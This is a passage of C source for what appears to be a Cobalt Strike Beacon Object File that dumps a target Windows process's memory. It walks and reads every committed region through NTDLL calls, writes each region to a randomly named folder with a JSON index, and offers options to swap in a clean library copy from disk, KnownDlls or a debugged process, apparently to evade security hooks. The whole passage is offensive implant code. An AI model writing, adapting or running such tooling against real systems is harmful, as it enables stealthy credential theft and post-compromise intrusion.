    MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);

    while ((long long)mem_address < proc_max_address_l) {
        // Populate MEMORY_BASIC_INFORMATION struct
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Get random name
            // char random_name[15];
            // generate_fixed_string_with_dot(random_name);
            // BeaconPrintf(CALLBACK_OUTPUT, "[+] fname: \t\t%s\n", random_name);

            // Read bytes
            SIZE_T regionSize = mbi.RegionSize;
            PVOID buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
            SIZE_T bytesRead = 0;     // Number of bytes actually read
            NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buffer, regionSize, &bytesRead);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
                BeaconPrintf(CALLBACK_OUTPUT, "NtReadVirtualMemory failed with status: 0x%p\n", ntstatus);
            }

            // Add to MemFile array
            MemFile memFile;
            char* buffer_name[17];
            MyIntToHexStr((long long) mem_address, buffer_name);
            MyStrcpy(memFile.filename, buffer_name, 17);        
            memFile.content = (unsigned char*) buffer;
            memFile.size = mbi.RegionSize;
            memFile.address = mem_address;
            memfile_list[memfile_count++] = memFile;
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }
    
    // Create JSON
    char* json_output = get_json(memfile_list, memfile_count);
    int data_len = MyStrLen(json_output);
    write_string_to_file(filename, json_output, data_len, TRUE);
    
    // Create dump files
    dump_files(memfile_list, memfile_count, barrel_folder_name);

    // Close handle
    NTDLL$NtClose(hProcess);
}


void go(IN PCHAR Buffer, IN ULONG Length) {
    // Get first argument value
    //      - disk:        0e0000000a0000006400690073006b000000
    //      - knowndlls:   18000000140000006b006e006f0077006e0064006c006c0073000000
    //      - debugproc:   180000001400000064006500620075006700700072006f0063000000
    datap parser;
    wchar_t *option_w = NULL;
    BeaconDataParse(&parser, Buffer, Length);
    option_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* option = "";
    if(option_w != NULL){
        option = ConvertUnicodeToAnsi(hHeap, option_w);
    }
    ReplaceLibrary(option);

    // Filename
    char* filename = "barrel.json";
    
    // Create folder with random name (or you can set a fixed folder name)
    char* barrel_folder_name[10];
    generate_random_string(barrel_folder_name, 10);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);

    Barrel(filename, barrel_folder_name);
}